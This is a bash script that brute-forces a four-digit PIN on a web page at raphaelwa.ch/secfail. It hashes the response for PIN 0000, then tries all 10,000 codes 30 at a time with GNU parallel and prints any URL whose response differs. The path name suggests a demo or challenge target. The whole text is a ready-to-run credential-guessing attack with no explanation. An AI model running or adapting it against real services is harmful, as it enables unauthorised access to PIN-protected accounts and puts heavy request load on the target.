initSum="$(curl -s http://raphaelwa.ch/secfail/?pincode=0000 | md5sum - |cut -d' ' -f1)"
export initSum

function fetch {
    sum="$(curl -s $1 | md5sum -|cut -d' ' -f1)"
    test $sum = $initSum || echo $1
}
export -f fetch

(for ((i=1; i<=9999; i++)); do echo http://raphaelwa.ch/secfail/?pincode=$(printf %04d $i); done) | parallel -P 30 fetch {}
